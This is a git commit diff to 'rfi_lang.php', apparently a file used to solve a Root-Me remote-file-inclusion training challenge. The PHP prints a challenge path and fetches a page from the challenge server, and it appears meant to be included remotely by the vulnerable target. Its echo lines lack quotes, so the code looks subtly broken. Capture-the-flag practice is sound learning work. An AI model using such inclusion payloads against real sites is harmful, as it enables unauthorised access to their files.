75a0ac0e34ca8387ec6a2fc193a7b657620b2128
0xy0d4 <76223635+0xy0d4@users.noreply.github.com>
2021-01-25 15:20:37 +0100

    Update rfi_lang.php

--- rfi_lang.php
+++ rfi_lang.php
@@ -1,5 +1,5 @@
 <?php
-echo index.php;
+echo /challenge/web-serveur/ch13/index.php;
 $homepage = file_get_contents('http://challenge01.root-me.org/web-serveur/ch13/?index.php');
 echo $homepage;
 ?>
